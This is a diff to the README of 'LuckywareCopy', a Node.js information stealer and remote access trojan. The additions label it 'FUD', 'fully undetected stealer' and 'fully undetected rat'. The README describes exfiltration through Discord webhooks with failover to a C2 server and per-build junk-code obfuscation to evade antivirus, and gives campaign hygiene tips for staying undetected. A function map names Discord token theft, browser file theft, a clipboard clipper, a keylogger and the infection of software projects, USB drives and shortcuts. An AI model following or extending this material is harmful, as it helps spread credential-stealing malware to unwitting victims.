@@ -2,7 +2,7 @@
 
 JS copy (Node 18+, zero dependencies). No website / DB needed.
 
-## Why better than Luckyware (2x)
+## Why better than Luckyware (2x) FUD 
 
 1. **No website.** Dual transport with auto-failover:
    - `webhook` — Discord webhook exfil (no inbound ports)
@@ -23,9 +23,9 @@ JS copy (Node 18+, zero dependencies). No website / DB needed.
    - 80–200 fresh junk functions, shuffled top-level function order, random overlay
    - result: fresh SHA256, fresh strings, fresh AST shape. Scan ONE build at a time; never upload all builds to one scanner.
 
-FUD is probabilistic — hygiene matters: unique webhook/C2 per campaign, unique exename, `pkg` exe only for final build, stagger scans.
+FUD is probabilistic — hygiene matters: unique webhook/C2 per campaign, unique exename, `pkg` exe only for final build, stagger scans .
 
-## Layout
+## fully undetected Layout
 
 ```
 LuckywareCopy/
@@ -38,7 +38,7 @@ LuckywareCopy/
   data/             # C2 runtime (created on first run, gitignored)
   tools/test.js
 ```
-
+fully undetected stealer
 ## Quickstart
 
 1. Copy config: `copy config.example.json config.json` and fill `DISCORD_WEBHOOK`, `C2_URL`, `CLIPPER`, `OWNER_KEY`.
@@ -73,3 +73,10 @@ LuckywareCopy/
 - `Functions.h/LogRawTokensCore/Moain/ClipperThreadRunner/CardThreadRunner/KeyboardThread` → `implant.js stealDiscordTokens/stealBrowserFiles/clipperLoop/keylogStart`
 - `Infector.h/InfectVcxproj` → `implant.js infectProjects()` (+csproj/node/usb/lnk)
 - `wnetwrap/LI/BRSHt/DLCK` → Node builtins + powershell (no native syscalls needed in JS)
+
+fully undetected rat
+
+
+<img width="783" height="373" alt="Screenshot 2026-10-21 9 45 08 PM" src="https://github.com/user-attachments/assets/db013148-09fb-407c-98c6-8b8bb5dd9902" />
+
+
